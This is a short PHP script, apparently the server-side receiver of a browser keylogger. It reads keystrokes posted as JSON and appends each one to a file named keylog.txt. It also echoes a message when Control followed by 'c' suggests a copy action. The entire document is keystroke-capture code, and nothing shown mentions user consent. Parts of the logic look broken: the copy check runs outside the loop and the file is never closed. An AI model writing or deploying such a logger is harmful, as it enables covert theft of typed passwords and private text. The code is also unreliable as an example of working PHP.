<?php
STATIC $cnt;
// (A) OPEN KEYLOG FILE, APPEND MODE
$file = fopen("keylog.txt", "a+");


// (B) SAVE KEYSTROKES
$keys = json_decode($_POST["keys"]);
foreach ($keys as $k=>$v) { fwrite($file, $v . PHP_EOL); }


if($v == 'Control'){
    $cnt=1;
    echo $cnt;
}else 
if($v=='c' and $cnt==1){
    echo "COPIED!!!!";
    echo $v;
    $cnt=0;
}
echo $cnt;
echo " ";

// (C) CLOSE & END
// fclose($file);
echo "  OK";